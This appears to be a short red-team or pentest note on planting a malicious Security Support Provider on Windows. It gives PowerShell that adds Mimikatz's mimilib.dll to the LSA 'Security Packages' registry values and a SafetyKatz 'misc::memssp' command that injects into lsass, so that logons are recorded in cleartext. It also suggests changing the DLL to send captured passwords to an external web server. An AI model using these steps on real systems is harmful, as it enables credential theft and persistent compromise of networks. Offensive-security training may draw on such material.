An SSP (Security Support Provider) is a DLL that allows for authentication in applications via **NTLM, Kerberos, Wdigest and CredSSP**

Mimikatz provides a custom SSP - `mimilib.dll` This SSP logs local logons,
service account and machine account passwords in clear text on the
target server.

If you have local admin on a machine you can inject your own custom SSP on the account.

Option 1: manually copy **mimilib.dll** into System32 and add the following reg keys
```powershell
$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'

$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name
'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
'Security Packages' -Value $packages
```

Option 2: Use mimikatz and inject it into lsass (Not super stable with Server 2019 and Server 2022 but still usable)
```powershell
SafetyKatz.exe -Command '"misc::memssp"'
```


> [!NOTE] **IMPORTANT**
> You'll still need Domain Administrator privileges to read the `mimilsa.log` file in System32
> a
> Customising the dll to send the logs to an external web server or to a file share would be best


Passwords will be logged in cleartext
![[Pasted image 20250510232411.png]]

